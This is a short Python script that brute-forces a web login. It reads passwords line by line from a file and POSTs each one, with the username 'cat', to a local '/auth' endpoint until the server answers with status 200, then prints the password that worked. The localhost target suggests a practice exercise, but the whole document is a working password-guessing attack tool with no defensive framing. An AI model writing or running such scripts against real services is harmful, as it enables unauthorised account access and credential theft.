import requests


index = 0

def get_next_password(passwords):

    global index
    password =  passwords[index]
    index += 1
    return password


def get_passwords_from_file(file_name):

    with open(file_name) as file:
        s = file.read()
        passwords = s.split('\n')

    return passwords


def main():

    status_code = 0
    step = 0

    passwords = get_passwords_from_file('pp.txt')

    while status_code != 200:
        password = get_next_password(passwords)
        r = requests.post('http://127.0.01:5000/auth', data={'login': 'cat', 'password': password})
        status_code = r.status_code

        if index % 100 == 0:
            print(password)
        step += 1

    print(f'Right password is {password}.')


if __name__ == '__main__':
    main()